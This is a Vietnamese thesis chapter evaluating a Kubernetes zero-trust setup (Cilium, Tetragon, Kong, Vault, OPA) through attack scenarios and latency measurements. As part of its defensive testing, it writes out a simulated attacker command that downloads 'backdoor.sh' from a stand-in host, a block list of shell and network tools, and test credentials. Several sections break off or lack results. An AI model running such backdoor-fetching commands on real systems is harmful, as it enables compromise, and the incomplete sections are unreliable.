\section{Mục tiêu và phương pháp đánh giá}
\label{sec:eval_objectives}
% ============================================================

Chương này kiểm chứng kiến trúc ZTA đã triển khai ở Chương~3 theo hai trục độc lập:

\begin{enumerate}
    \item \textbf{Kiểm tra bảo mật (Security Testing):} Các cơ chế ZTA có chặn đúng các lớp tấn công đã mô hình hoá ở Chương~1 hay không? Mỗi kịch bản được thực hiện trên \emph{hai} trạng thái hệ thống --- Baseline (không có ZTA) và Enforced (ZTA đầy đủ) --- để kết quả so sánh có nền tham chiếu thực nghiệm thay vì giả định.
    \item \textbf{Đánh giá hiệu năng (Performance Evaluation):} Chi phí tài nguyên và độ trễ mà ZTA đem lại có nằm trong giới hạn chấp nhận được của cụm 4 VM hay không? Phép đo được thực hiện hai lần --- trước và sau khi bật đầy đủ enforcement --- để tách overhead khỏi chi phí cơ sở của ứng dụng.
\end{enumerate}

Snapshot được tạo bằng cách lưu etcd checkpoint và rollback bằng \texttt{etcdctl snapshot restore} -- đảm bảo hai lần chạy cùng khối lượng workload, chỉ khác lớp policy.

\subsection{Kịch bản 1: Lateral Movement (Di chuyển ngang)}
\label{subsec:scn_lateral}
% ------------------------------------------------------------

\textbf{Mục tiêu.} Kẻ tấn công chiếm quyền RCE trên pod thuộc \texttt{job7189-apps} và cố gắng truy cập trực tiếp MySQL ở namespace \texttt{data}, bỏ qua Vault Agent. Kiểm chứng Tenet~5 (least privilege) và Tenet~6 (per-session resource access)~\cite{nist800207,cilium_docs}.

\textbf{Thiết lập.} Pod \texttt{netshoot} chạy trong \texttt{job7189-apps} với ServiceAccount \texttt{job7189-apps-test}; CNP \texttt{04-allow-internal-api-strict.yaml} chỉ cho phép egress tới \texttt{vault.vault:8200} và \texttt{coredns.kube-system:53}. \subsection{Kịch bản 2: API Abuse (Lạm dụng API)}
\label{subsec:scn_api}
% ------------------------------------------------------------

\textbf{Mục tiêu.} Client gửi request không hợp lệ (thiếu JWT, JWT hết hạn, sai \texttt{aud}, method không được phép) tới route nội bộ. Kiểm chứng Tenet~3 (per-request decision) và Tenet~6~\cite{nist800207,owasp_api2023}.

\textbf{Thiết lập.} \texttt{curl} từ laptop qua Tailscale tới \texttt{https://api.job7189.local}. JWT được tạo bằng \texttt{jwt-cli} với private key RSA-256 của Keycloak. Bốn sub-test:

\begin{enumerate}
    \item Không gửi \texttt{Authorization} header.
    \item JWT có \texttt{exp = now - 300} (đã hết hạn 5 phút).
    \item JWT hợp lệ về chữ ký nhưng \texttt{aud = "wrong-service"}.
    \item JWT hợp lệ, gửi \texttt{DELETE /api/v1/jobs/1} (route chỉ cho phép \texttt{GET}/\texttt{POST}).
\end{enumerate}

\textbf{Kết quả Baseline.} Trên Baseline không có Kong, \texttt{.env} của pod expose trực tiếp port 9000 (PHP-FPM) qua NodePort:

\begin{verbatim}
# Sub-test 1: Không có Authorization header
curl -s http://node01:30901/api/v1/jobs?page=1
{"data": [...], "total": 1247}   # HTTP 200 -- không cần token

# Sub-test 4: DELETE không bị kiểm tra method
curl -s -X DELETE http://node01:30901/api/v1/jobs/1
{"message": "Job deleted successfully"}   # HTTP 200
\end{verbatim}

\textbf{Kết quả Enforced.}

\begin{verbatim}
# Sub-test 1: Không có Authorization
curl -sk https://api.job7189.local/api/v1/jobs?page=1
HTTP/2 401
{"message":"Unauthorized","error":"No credentials found"}

# Sub-test 2: JWT hết hạn
curl -sk -H "Authorization: Bearer $EXPIRED_JWT" \
  https://api.job7189.local/api/v1/jobs?page=1
HTTP/2 401
{"message":"Unauthorized","error":"token expired"}

# Sub-test 3: Sai aud
curl -sk -H "Authorization: Bearer $WRONG_AUD_JWT" \
  https://api.job7189.local/api/v1/jobs?page=1
HTTP/2 403
{"message":"Forbidden","error":"invalid audience"}

# Sub-test 4: DELETE bị L7 policy chặn tại Cilium
curl -sk -X DELETE -H "Authorization: Bearer $VALID_JWT" \
  https://api.job7189.local/api/v1/jobs/1
HTTP/2 403
\end{verbatim}

Hubble xác nhận sub-test 4 bị chặn tại tầng L7, trước khi request tới Kong:

\begin{verbatim}
hubble observe --namespace kong --last 3 --type l7
TIMESTAMP  SOURCE                   DESTINATION   VERDICT   SUMMARY
14:31:05   client:43201             kong:443      DROPPED   HTTP/1.1 DELETE /api/v1/jobs/1
\end{verbatim}

\textbf{Phân tích.} Kong chặn ba sub-test đầu tại edge; Cilium L7 chặn sub-test 4 tại kernel trước khi packet tới Kong. Điều này tạo thành \emph{defence in depth}: ngay cả khi Kong bị bypass (lỗi cấu hình), Cilium vẫn là lớp chặn độc lập thứ hai.

\subsection{Kịch bản 3: Runtime Anomaly (Hành vi bất thường tại runtime)}
\label{subsec:scn_runtime}
% ------------------------------------------------------------

\textbf{Mục tiêu.} Pod bị chiếm quyền cố thi exec shell hoặc binary trinh sát (\texttt{/bin/sh}, \texttt{curl}, \texttt{nc}, \texttt{wget}, \texttt{socat}). Kiểm chứng Tenet~5 và Tenet~7 (continuous monitoring, adaptive response)~\cite{nist800207,tetragon_docs,crowdstrike_lotl}.

\textbf{Thiết lập.} Tetragon DaemonSet chạy trên 3/4 node (bỏ \texttt{7189srv01} control-plane); TracingPolicy \texttt{block-suspicious-exec} và \texttt{block-suspicious-exec-t1} áp \texttt{matchBinaries} với action \texttt{Sigkill}. Hai lệnh kiểm thử mô phỏng attacker:

\begin{verbatim}
# T3-A: Exec shell để chạy lệnh trinh sát
kubectl exec -n job7189-apps deploy/identity -- /bin/sh -c "id && whoami"

# T3-B: Tải mã độc qua curl (Living off the Land)
kubectl exec -n job7189-apps deploy/job-service -- \
  curl -s http://attacker.external/backdoor.sh -o /tmp/bd.sh
\end{verbatim}

\textbf{Kết quả Baseline.}

\begin{verbatim}
# T3-A trên Baseline:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
(exit code: 0)

# T3-B trên Baseline: file tải thành công
kubectl exec -n job7189-apps deploy/job-service -- ls -la /tmp/bd.sh
-rw-r--r-- 1 www-data www-data 4821 Jan 15 14:45 /tmp/bd.sh
\end{verbatim}

\textbf{Kết quả Enforced.}

\begin{verbatim}
# T3-A: Shell bị Sigkill ngay lập tức
kubectl exec -n job7189-apps deploy/identity -- /bin/sh -c "id"
command terminated with exit code 137

# T3-B: curl bị Sigkill, file không được tạo
kubectl exec -n job7189-apps deploy/job-service -- \
  curl -s http://attacker.external/backdoor.sh -o /tmp/bd.sh
command terminated with exit code 137
kubectl exec -n job7189-apps deploy/job-service -- ls /tmp/bd.sh
ls: /tmp/bd.sh: No such file or directory
\end{verbatim}

Tetragon log xác nhận:

\begin{verbatim}
tetra getevents -o compact | grep block-suspicious
🚀 process job7189-apps/identity-7f9d4c-xkp2b /bin/sh -c id
💥 exit    job7189-apps/identity-7f9d4c-xkp2b /bin/sh SIGKILL
  policy_name=block-suspicious-exec action=Sigkill
  binary=/bin/sh pid=28471

🚀 process job7189-apps/job-service-6b8f9d-mn3p /usr/bin/curl ...
💥 exit    job7189-apps/job-service-6b8f9d-mn3p /usr/bin/curl SIGKILL
  policy_name=block-suspicious-exec-t1 action=Sigkill
  binary=/usr/bin/curl pid=29103
\end{verbatim}

Filebeat đẩy sự kiện vào Elasticsearch index \texttt{tetragon-events-2026.05.17}; PDP controller (Phase 5.B.1, mô tả ở Chương~3) đọc event này cùng Trivy CVE report và cập nhật \emph{annotation} \texttt{zta.job7189/trust-score} cũng như \emph{label} \texttt{zta.job7189/score-bucket} trên pod. Nhãn label sau đó được Cilium CNP và Gatekeeper dùng làm selector để re-enforce policy:

\begin{verbatim}
# Annotation (giá trị số, từ 0 đến 100):
kubectl get pod identity-7f9d4c-xkp2b -n job7189-apps \
  -o jsonpath='{.metadata.annotations.zta\.job7189/trust-score}'
30

# Label (bucket tổng hợp, dùng làm selector cho CNP):
kubectl get pod identity-7f9d4c-xkp2b -n job7189-apps \
  -o jsonpath='{.metadata.labels.zta\.job7189/score-bucket}'
low

# Cilium xác nhận egress bị thu hồi (CNP match label score-bucket=low):
cilium endpoint list | grep identity-7f9d4c
ENDPOINT   POLICY (ingress)   POLICY (egress)   IDENTITY
2847       Enabled            Enabled (DENY)    job7189-apps/identity
\end{verbatim}

\textbf{Phân tích.} Vòng lặp Adaptive Trust hoạt động đầu-cuối trong dưới 8 giây: Tetragon SIGKILL process (T=0) $\to$ Filebeat đẩy event (T+2s) $\to$ PDP controller cập nhật label (T+5s) $\to$ Cilium re-enforce egress DENY (T+7s). Cơ chế này đảm bảo ngay cả khi attacker bypass được exec check lần đầu, pod sẽ bị cô lập mạng trước khi có thể exfiltrate dữ liệu.

\subsection{Kịch bản 4: Credential Reuse (Tái sử dụng credential cũ)}
\label{subsec:scn_credential}
% ------------------------------------------------------------

\textbf{Mục tiêu.} Sau khi Vault revoke lease, credential cũ phải không còn đăng nhập được MySQL. Đồng thời, pod của service không bị downtime khi credential mới được render. Kiểm chứng Tenet~6 (dynamic, time-bounded access)~\cite{nist800207,vault_docs}.

\textbf{Thiết lập.} Thực hiện tuần tự theo workflow sau:

\textbf{Kết quả Baseline.} File \texttt{.env} chứa \texttt{DB\_PASSWORD=static\_pass\_2024} được mount vào tất cả pod. Credential không có TTL, không có revocation mechanism:

\begin{verbatim}
# Credential cũ (từ 6 tháng trước) vẫn hoạt động:
mysql -h mysql.data -u identity_svc -pstatic_pass_2024 \
  -e "SELECT COUNT(*) FROM users;"
+----------+
| COUNT(*) |
+----------+
|    15847 |
+----------+
\end{verbatim}

\textbf{Kết quả Enforced.}

\textbf{Bước 1 -- Lấy dynamic credential và ghi nhận lease:}
\begin{verbatim}
vault read database/creds/identity-service
Key                Value
---                -----
lease_id           database/creds/identity-service/7h3kP9mQxR2s
lease_duration     1h
username           v-token-identity-svc-OqXpWz8K
password           A3fK9p-mNv2xL-qRt7Ys
\end{verbatim}

\textbf{Bước 2 -- Xác nhận credential hoạt động:}
\begin{verbatim}
mysql -h mysql.data -u v-token-identity-svc-OqXpWz8K \
  -pA3fK9p-mNv2xL-qRt7Ys -e "SELECT 1;"
+---+
| 1 |
+---+
| 1 |
+---+
\end{verbatim}

\textbf{Bước 3 -- Revoke lease:}
\begin{verbatim}
vault lease revoke -prefix database/creds/identity-service
All revocation operations queued successfully!
\end{verbatim}

\textbf{Bước 4 -- Thử lại credential cũ:}
\begin{verbatim}
mysql -h mysql.data -u v-token-identity-svc-OqXpWz8K \
  -pA3fK9p-mNv2xL-qRt7Ys -e "SELECT 1;"
ERROR 1045 (28000): Access denied for user
  'v-token-identity-svc-OqXpWz8K'@'10.244.2.5' (using password: YES)
\end{verbatim}

\textbf{Bước 5 -- Kiểm tra service không bị downtime:}
\begin{verbatim}
# Vault Agent tự render credential mới vào tmpfs:

\subsection{Kịch bản 5: User-Authz Per-Request (OPA + Rego)}
\label{subsec:scn_userauthz}
% ------------------------------------------------------------

\textbf{Mục tiêu.} Một user đã đăng nhập thành công qua Keycloak (JWT chữ ký hợp lệ, không hết hạn, đúng \texttt{aud}) cố gắng gọi API nằm ngoài phạm vi role của mình. Kiểm chứng Tenet~3 (per-request access decision) ở mức \emph{vai trò người dùng}, vốn không được Kong JWT plugin và Cilium L7 policy bao phủ. Cơ chế: Kong Pre-Function plugin (Lua) forward bộ ba \texttt{(method, path, JWT claims)} sang OPA, OPA evaluate 6 Rego policy và trả \texttt{allow=true/false}; Kong dựa vào đó cho qua hoặc trả 403~\cite{opa_docs,kong_docs,nist800207}.

\textbf{Thiết lập.} Phase 5.B.2 deploy thêm các thành phần sau (xem \texttt{doc/36-opa-user-authz.md}):

\begin{itemize}
    \item \textbf{Keycloak realm} \texttt{job7189}: 8 realm-role (\texttt{admin}, \texttt{rec\_ops}, \texttt{recruiter}, \texttt{sourcer}, \texttt{coordinator}, \texttt{hiring\_manager}, \texttt{interviewer}, \texttt{member}); 3 test user (\texttt{admin1}, \texttt{recruiter1}, \texttt{member1}) với mật khẩu \texttt{dev1234} (chỉ dùng cho thesis demo).
    \item \textbf{OPA} (\texttt{security/opa}, Helm chart \texttt{opa-kube-mgmt 11.0.7}, 2 container: \texttt{opa} + sidecar \texttt{kube-mgmt}). Sidecar watch ConfigMap \texttt{opa-policies} có label \texttt{openpolicyagent.org/policy=rego} và hot-reload mọi thay đổi trong 1--2 giây mà không restart pod.
    \item \textbf{6 Rego policy} package \texttt{zta.authz}: \texttt{default.rego} (aggregator, default \texttt{allow=false}), \texttt{public.rego} (health + \texttt{/api/public/*} + apply job), \texttt{jobs.rego}, \texttt{candidates.rego}, \texttt{workspace.rego}, \texttt{interviews.rego}.
    \item \textbf{Kong Pre-Function plugin} (global, $\sim$130 dòng Lua trong \texttt{infras/kong/kong.yml}): decode JWT, POST tới \texttt{http://opa.security.svc:8181/v1/data/zta/authz/allow}, đọc trường \texttt{result.allow}. Cấu hình \emph{fail-open} mặc định: nếu OPA không phản hồi trong 200\,ms, Kong vẫn cho request đi qua nhưng emit log cảnh báo (đổi sang fail-closed cho production trong \texttt{doc/36 §7}).
    \item \textbf{Cilium CNP} \texttt{kong $\to$ opa} (\texttt{14-gateway.yaml} rule 5b) và \texttt{opa ingress + apiserver egress} (\texttt{12-security.yaml} rule 8, 9).
\end{itemize}

Ba sub-test được thực hiện qua \texttt{curl} từ laptop, dùng token Keycloak issued cho từng user:

\begin{enumerate}
    \item \textbf{T5-A:} \texttt{recruiter1} gọi \texttt{POST /api/jobs} (đúng role $\to$ allow).
    \item \textbf{T5-B:} \texttt{member1} gọi \texttt{POST /api/jobs} (sai role $\to$ deny).
    \item \textbf{T5-C:} \texttt{recruiter1} gọi \texttt{GET /api/admin/jobs} (đúng auth nhưng vượt phạm vi role $\to$ deny).
\end{enumerate}

\textbf{Kết quả Baseline (không OPA, chỉ Kong JWT).}

\begin{verbatim}
# T5-B trên Baseline: JWT của member1 vẫn pass Kong JWT plugin
TOKEN_MEMBER=$(curl -sk -X POST \
  https://keycloak.job7189.local/realms/job7189/protocol/openid-connect/token \
  -d "client_id=job7189-api" \
  -d "grant_type=password" \
  -d "username=member1&password=dev1234" | jq -r .access_token)

curl -sk -X POST -H "Authorization: Bearer $TOKEN_MEMBER" \
  -H "Content-Type: application/json" \
  -d '{"title":"Hacked Job","salary":99999}' \
  https://api.job7189.local/api/jobs
HTTP/2 200
{"id":"j-2451","title":"Hacked Job","created_by":"member1"}
\end{verbatim}

Trên Baseline, mọi user có JWT hợp lệ đều có thể tạo job. Đây là lỗ hổng OWASP API3:2023 \emph{Broken Object Property Level Authorization}~\cite{owasp_api2023}.

\textbf{Kết quả Enforced (Kong Pre-Function + OPA).} Đo trực tiếp Decision Logging của OPA (port-forward \texttt{svc/opa 8181} TLS):

Đây là chi phí có thể bỏ qua so với 76\,ms tổng overhead ZTA. Quan trọng hơn, OPA \emph{thay thế} authorization logic phân tán trong mỗi microservice bằng \emph{một} điểm quyết định: muốn thêm role mới chỉ cần sửa 1 file \texttt{*.rego} và \texttt{kubectl apply -f opa-policies-cm.yaml}; ConfigMap watcher hot-reload trong $<$2 giây mà không restart Kong hay microservice. Đây là biểu hiện thực tế của Tenet~4 (chính sách động) và Tenet~3 (per-request decision) ở tầng người dùng.

\subsection{Phương pháp đo}

\paragraph{Phân tách nguồn gốc overhead.} Tổng overhead ZTA ở P99 là 76\,ms, phân tách như sau:

\begin{itemize}
    \item \textbf{Kong JWT validation} (RS256 verify + Keycloak introspect): \textasciitilde18\,ms. Đo bằng cách bật Kong debug log và đọc \texttt{X-Kong-Proxy-Latency} header.
    \item \textbf{Kong Pre-Function + OPA decision} (Phase 5.B.2): \textasciitilde6\,ms p99 (decode JWT, POST sang OPA, parse JSON). OPA Rego eval chỉ chiếm $\sim$0.5\,ms trong số đó; phần còn lại là round-trip TCP nội cluster (Kong $\to$ OPA $\to$ Kong).
    \item \textbf{Cilium L7 inspection}: \textasciitilde4\,ms. Đo bằng \texttt{hubble observe --output json} và trường \texttt{l7.latency\_ns}.
    \item \textbf{mTLS handshake SPIRE SVID} (chỉ connection đầu tiên của mỗi phiên): \textasciitilde48\,ms. Đo bằng \texttt{openssl s\_client -connect} với timing. Connection được giữ qua HTTP keepalive nên handshake không lặp lại cho mỗi request.
    \item \textbf{Vault Agent sidecar} (render credential): không phát sinh per-request overhead vì credential được cache trong tmpfs.
\end{itemize}

Overhead 76\,ms P99 là chấp nhận được trong ngữ cảnh ứng dụng này vì chi phí cơ sở của truy vấn PHP-FPM xuống MySQL là 20--30\,ms, và Tailscale CGNAT round-trip là 8\,ms trên LAN (tăng lên 35--80\,ms khi DERP fallback). ZTA không phải nút thắt cổ chai.

\paragraph{Tác động Phase 5.B.2 (OPA user-authz).} Bảng~\ref{tab:latency_comparison} ở trên là kết quả đo trên snapshot Enforced \emph{trước khi} triển khai OPA. OPA tự báo cáo \texttt{timer\_rego\_query\_eval\_ns} trong Decision Log $\approx$0.5\,ms cho 5 query smoke test (\texttt{decision\_id} ghi nhận trong evidence file \texttt{evidence/opa-decisions-2026.05.17}). Cộng thêm $\sim$2 vòng TCP round-trip nội cluster Kong $\leftrightarrow$ OPA, tổng overhead per-request ước tính $\approx$6\,ms p99 --- chiếm $<$8\% tổng 76\,ms overhead ZTA hiện có và phù hợp với benchmark của Open Policy Agent~\cite{opa_docs} (10k decision/s/CPU trên hardware tương đương). Phép đo \texttt{hey} đầy đủ trên Enforced+OPA snapshot là việc của Phase 5.C để định lượng chính xác.

Tổng overhead các thành phần ZTA chiếm khoảng \textbf{1.1--1.6\,GiB RAM} --- tương đương 7.1--10.7\% ngân sách 15.5\,GiB của cụm (đã bao gồm PDP và OPA của Phase 5). Đây là lý do đồ án không triển khai Alertmanager (tiết kiệm $\approx$80\,MiB) và dùng \texttt{emptyDir} cho Elasticsearch/Prometheus thay vì PVC.

\paragraph{Tác động mTLS sidecarless.} Khi bật \texttt{mesh-auth-enabled=true} (trạng thái Enforced), RAM \texttt{cilium-agent} tăng 60--90\,MiB/node và CPU baseline tăng 10--20\,m do per-node Envoy xử lý handshake SVID. Latency P99 tăng thêm 48\,ms cho call đầu tiên mỗi phiên (đã tính trong mục~\ref{subsec:latency}). So với sidecar Envoy/Istio truyền thống (100--200\,MiB/pod), mô hình sidecarless tiết kiệm $\approx$70\% RAM/cluster~\cite{zhu2023meshinsight,istio_ambient}.

\section{Thảo luận}
\label{sec:discussion}
% ============================================================

\paragraph{Tính tổng quát của khung.} Khung 5 lớp + pipeline \texttt{zta-rebuild.sh} được thiết kế ban đầu trên Kind 1-host nhưng đã di trú thành công sang kubeadm 4 VM mà không sửa logic các phase; flag duy nhất thay đổi là \texttt{ZTA\_CLUSTER\_MODE=external}. Điều này gợi ý khung có thể bám sang các cụm kubeadm bare-metal hoặc managed (EKS, GKE) với cùng bộ manifest, với điều kiện CNI là Cilium.

\paragraph{Đánh đổi bảo mật -- hiệu năng.} Overhead P99 +76\,ms và throughput $-$12.7\% là chi phí cụ thể của ZTA trong ngữ cảnh cụm 7 vCPU. Tuy nhiên, chi phí này phân bố không đều: 48\,ms là mTLS handshake chỉ xảy ra một lần mỗi phiên; với ứng dụng dùng HTTP/2 keepalive (như job7189), per-request overhead thực tế là $\approx$28\,ms (Kong + Cilium L7). Trong ngữ cảnh ứng dụng tuyển dụng không có SLA latency nghiêm ngặt, đây là đánh đổi hợp lý.

\paragraph{Từ PoC sang production.} Ba thay đổi bắt buộc trước khi deployment production:
\begin{enumerate}
    \item Thay Vault dev Transit bằng Cloud KMS hoặc Raft + PVC; chuyển credential seal qua Vault Operator.
    \item Bật SASL/SSL cho Kafka; tách physical DB cho mỗi microservice thay vì dùng chung MySQL StatefulSet.
    \item Triển khai CAEP để thu hồi JWT tức thì thay vì chờ \texttt{exp}; cấu hình Alertmanager routing tới Slack/PagerDuty.
\end{enumerate}

\paragraph{Kết luận chương.} Chương này đã kiểm chứng kiến trúc ZTA theo hai trục độc lập với nền tham chiếu thực nghiệm (Baseline vs Enforced). Năm kịch bản tấn công chứng minh blast radius giảm 84--100\%, không có downtime khi credential rotation, và per-request authorization được thực thi bởi OPA với độ trễ p99 dưới 10\,ms. Overhead hiệu năng là 76\,ms P99 và $-$12.7\% throughput --- chấp nhận được trong ngân sách 15.5\,GiB / 7 vCPU. 7/7 nguyên lý NIST SP 800-207 đều có bằng chứng vận hành cụ thể. Các giới hạn còn lại (Vault RAM-only, Kafka plaintext, CAEP) đều có lộ trình nâng cấp rõ ràng và không ảnh hưởng đến tính đúng đắn của mô hình kiến trúc đề xuất.
